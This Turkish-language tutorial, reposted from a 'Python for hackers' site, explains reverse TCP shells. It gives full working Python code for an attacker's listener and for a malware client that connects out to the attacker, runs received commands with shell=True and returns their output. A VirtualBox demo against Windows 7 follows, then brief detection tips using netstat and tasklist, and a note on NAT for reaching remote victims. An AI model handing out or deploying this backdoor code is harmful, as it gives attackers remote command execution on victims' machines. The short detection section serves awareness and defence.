🕊 Bu döküman [**@KekikAkademi**](https://t.me/KekikAkademi "Telegram: @KekikAkademi") için oluşturulmuştur. ✌🏼
________________________________
# Python Reverse TCP Shell (Socket)
![Python Reverse TCP Shell (Socket)](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/1-python-socket-programming.png)

**Python**  ile  **Reverse TCP Shell**  yönteminden ve bir malware’in sisteme bulaştığı zaman saldırgana nasıl backdoor (arka kapı) açtığından bahsedip, kod bloğumuz içinde yer alacak satırlarları açıklayacağız. Yazımızın sonunda ise farkındalık oluşturmak adına birkaç linux ve windows komutundan bahsedeceğim.

Günümüzde gerek network katmanında gerekse host veya server katmanında dışarıdan gelebilecek bağlantılar için firewall’larda port kısıtlamaları son derece önem gösterilerek yapılmaktadır. Server üzerinde istenilmeyen servislerin aktif edilmeyerek socket açmaması, son kullanıcı bilgisayarlarına dışarıdan gelen tüm bağlantıların kapatılması, alınan önlemlerden bir kısmı diyebiliriz. Bunca güvenlik önlemi alınırken saldırganlarda boş durmadı ve “ biz sisteme sızamıyorsak onlar bizim ayağımıza gelsin” yöntemini geliştirdiler. Peki bu nasıl oluyor ? Bunun birçok yöntemi var, server sistemlerde kullanılan uygulamanın zaafiyeti olmasından kaynaklanan bir açıktan tutun bir malware’in sisteme bulaşmasına ve bu zararlı yazılımın saldırgana backdoor ile bağlanmasını sağlamaya kadar gidiyor. Buradaki kilit kelime “ **socket** ”.

![Saldirgan Bekleyis](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/2-Socket.png)
*VE HACKER, SOCKET AÇARAK BEKLEYİŞE GEÇER…*

## **Nedir bu Socket?**

Network üzerinde çalışmasını istediğiniz bir uygulama veya servis olduğu zaman ethernet kartınızın ip adresi ile uygulamanın çalışması için verilen port bilgisi birleşir (socket) ve bu ikili uygulamanıza gelecek istekleri karşılamak için dışarıya bağlantı açar. İnternet üzerinden bağlandığınız web sitelerini buna örnek gösterebiliriz. Browser’ınıza bir site adresi yazdığınızda “**python4hackers.com:80**” diye çalışır. Siz her ne kadar “80” portunu görmesenizde (80 haricinde görürsünüz) python4hackers server’larına bu istek, “**ip:port**” isteği olarak gider ve python4hackers server üzerinde çalışan IIS veya Apache socket’in karşılığı olan uygulamayı kullanıcıya döndürür (Server tarafında bu socket açıksa).

	import socket #Socket oluşturmak için kullandığımız modül

	port=7790 #Saldırganın dinleyeceği port adresi
	ip="192.168.0.32" #Saldırgan'ın dış dünya ile bağlantısını sağlayan IP adresi
	
	def baglanti():
	    Socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
	    Socket.bind((ip,port))
	    Socket.listen(1)

	    socketaddr,ipaddr= Socket.accept()
	    print('Baglanti gerceklesti',ipaddr)

	    while True:
	        komut= input("Shell> ")
	        if 'cikis' in komut:
	            socketaddr.send('cikis')
	            socketaddr.close()
	            break
	        else:
	            socketaddr.send(komut)
	            print(socketaddr.recv(1024))
	baglanti()

Görüldüğü üzere server-client mimarisi bir uygulama yazıyorsanız, python’da socket kütüphanesini kullanıyorsunuz. Oluşturduğumuz fonksiyonu açıklarsak;

`Socket=socket.socket()` ile yeni bir **socket** oluşturduk.

`socket.AF_INET` ile çağırarak **IPv4** model bir socket olacağın belirttik.

`socket.SOCK_STREAM` ile **TCP** temelli bir haberleşme olacağını belirttik (SOCK_DGRAM udp için).

`Socket.bind((ip,port))` hatırlarsanız socket tanımını yaparken hep **ip:port** ikilisi diye bahsetmiştik. İşte burada da oluşturduğumuz Socket’e ip:port bilgisini atadık ve çalıştığı makinada (saldırgan makina) interface’in IP ve hangi port adresini dinleyeceğini söyledik. *"0.0.0.0"* yaparsanız üzerindeki tüm ip almış interface’leri dinler.

`Socket.listen(1)` aynı anda **kaç bağlantıyı dinleyeceğini** belirttik.

`socketaddr,ipaddrr=Socket.accept()`  oluşturduğumuz **socket’e gelecek bağlantıları kabul etmek için** accept()’i çağırdık ve client tarafından açtığımız socket’e bağlantı geldiği zaman *size iki liste elemanı döndürür*, karşı tarafla oluşan socket objesini ve bağlanan makinanın ipadresi:port bilgisi.

`while` döngüsünde, bağlantı oluştuğu zaman, raw_input() ile **saldırgandan komut girmesini bekliyoruz.** Girilen bu komutda “cikis” adli bir kelime geçiyorsa socket’i kapatmasını `socketaddr.close()` yani bağlantıyı sonlandırmasını, geçmiyorsa da girilen komutu, oluşan bağlantı socket’inde `socketaddr.send(komut)`  yardımı ile karşı tarafa göndermesini (malware yüklü makina).

`print socketaddr.recv(1024)` *TCP bir bağlantı olduğu için* gönderdiğimiz **komuta karşılık gelen paketi’in 1 Mb’lık değerini** ekrana yazıyoruz.

`baglanti()` komutu ile de fonksiyonumuzu çağırıyoruz yani çalıştırıyoruz.
##
Gelelim şimdi malware yüklü veya client tarafına.

	import socket
	import subprocess

	port=7790
	ip="192.168.0.32"
	def baglanti():
	    Socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	    Socket.connect((ip,port))

	    while True:
	        komut = Socket.recv(1024)

	        if 'cikis' in komut:
	            Socket.close()
	            break
	        else:
	            CMD=subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	            Socket.send(CMD.stdout.read())
	            Socket.send(CMD.stderr.read())

	baglanti()​

Bir önceki komut dizinimizde detaylı olarak Python’da socket oluşturmayı gösterdiğim için burada fazla detaya girmiyorum.

`subprocess` modülü **alt işlemler oluşturmanıza** (bir işlem çalışıyorken aynı anda başka bir işlemi alt işlem olarak çalıştırmanıza) ve bu işlemin sonucunda dönen girdi/çıktı/hata değerlerini yöneterek *PIPE ile bağlamanızı* **sağlar**.

`Socket.connect((ip,port))` ile saldırgan makinamıza **bağlanma talebi yolladık.**

`komut=Socket.recv(1024)` bir önceki komut dizinimizde **saldırganın raw_input ile gönderdiği komutu,** *komut adlı değişkenimize atıyoruz* ve komut içinde cikis yazıyorsa(saldırgan bu komutu yollamıssa) socket’i sonlandırıyoruz (sürekli açık kalıp, bir sonraki aşamada socket kullanılıyor demesin diye).

`CMD.subprocess.Popen(komut, shell= True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)` kullanmamızın nedeni bir üst işlem ile aynı anda çalışacağını belirttik ve (komut) adlı değişkenimizi argüman olarak çağarıp, shell=True diyerek shell’i çağardık ve argümanımızı buraya yazdık. Normalde shell değerini injection ataklara karşı false yapmamızı önerirler ama bizim işimiz zaten bu ..

bir alt satırda yazan `socket.send(CMD.stdout.read())` ve `socket.send(CMD.stderr.read())` subprocess işleminde dönen çıktıyı ve hatayı okuyarak socket’e yani saldırgana yolluyoruz. Böylece saldırgan raw_input ile bir komut yolladığında, malware yüklü client makinamız bu komutu alıyor, subprocess ile shell’e yazıyor, dönen cevabı saldırgana açılan socket üzerinden yolluyor.

Evet Gelelim bir ekran görüntüsü ile bu yazdığımızı açıklamaya. Benim test ortamımda (VirtualBox) Windows 7 (Malware yüklü client), bir de Kali Linux yüklü saldırgan dediğim makinam var.

![Windows & Kali Machine](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/3-python-socket-programming.png)
Şimdi tek yapmamız gereken saldırgan makinada SocketServer.py scriptimizi çalıştıralım ve client tarafından malware’in çalışıtırıldığı zamanki durumu görelim.

![Attacker-Victim](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/4-python-socket-programming.png)
Gördüğünüz gibi kurban makinamız malware’i çalıştırdı ve saldırgan makina reverse TCP shell alarak, windows üzerinde bulunduğu dizinde neler olduğunu görmen için “dir” komutunu çalıştırdı. İşlemlerini bitirdikten sonrada “cikis” komutu ile socket’i kapattı. Tabi bu yaptığım örnek sadece  _reverse TCP shell nedir?_  sorusuna cevap niteliğinde basit client-server uygulamasıydı. Günümüzde birçok malware analiz edildiği zaman “7777” portunu kullandığınıda dip not olarak eklemek isterim. Gelir bir de analiz aşamasında client makinada neler oluyor çok ufak ona bakalım.

`netstat -naob` (yönetici yetkisi ile) komutunu çalıştırarak TCP veya UDP üzerinden bağlantı kurmuş makinaları görebilirsiniz. “o” parametresi size işlem id’yi, “b” parametresi ile o işlem id’ye karşılık gelen uygulama adını gösterir.

![python-socket-programming4](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/5-python-socket-programming.png)
Gördüğünüz gibi client makinamız saldırgan ip adresine “6161 ” bağlantı kurmuş. Tabi bu sizin için anormal bir trafik olduğunu düşündürüp, birde bu uygulamanın hangi serisleri çalıştırdığına bakmanız ihtiyacını doğuruyor.

`tasklist /svc` ilede çalışan uygulamalara atanan servislerin listesini gösterir.

![python-socket-programming5](https://raw.githubusercontent.com/KekikAkademi/KekikPython/master/9-Py4H-Reverse-TCP-Shell-Socket/images/6-python-socket-programming.png)
Malware kendini hiçbir servise bind etmemiş, tabi bizimki masum bir malware olduğu için bu böyle. Normalde siz bu işlem id’sini gördüğünüzde o işlemi sonlandıracağını tahmin ettiği için kendini başka bir servise bind eder ve daha detaylı bir analiz yapmanızı gerektirir.

**Not: Bu işlem için saldırgan makinanız ile client aynı network’de değilse, saldırgan uygulamanız için modem veya firewall’dan NAT tanımlaması yapmanız gerekir.**

Evet arkadaşlar basit anlamda bu yazımızda Reverse TCP shell’i anlatmaya çalıştık, umarım amaca hizmet edebilmişizdir. Bir sonraki yazımızda görüşmek üzere.

[Kaynak](http://python4hackers.com/python-network-hacking-tools/python-reverse-tcp-shell-socket-create.html "Saygı ve Özlemle...")
________________________________
📃 **Yandex.Disk Bünyemizde 900GB veri olmuştur.**

_Paylaşılan Kursların Tümünü_ [**@KekikKahve**](https://t.me/KekikKahve) _Grubu notlarından Çağırabilirsiniz.._

🕊️ Bize **oy verip** _paylaşarak_ destek olmaya ne dersin? ✌🏼
#
> Bu readme sayfası oluşturulurken [prose.io](http://prose.io/ "prose.io") ve [stackedit.io](https://stackedit.io/app "stackedit.io") araçlarından yardım alınmıştır..
> Emojiler için [webfx](https://www.webfx.com/tools/emoji-cheat-sheet/ "Emoji Cheat Sheet") sayfası kullanılmıştır.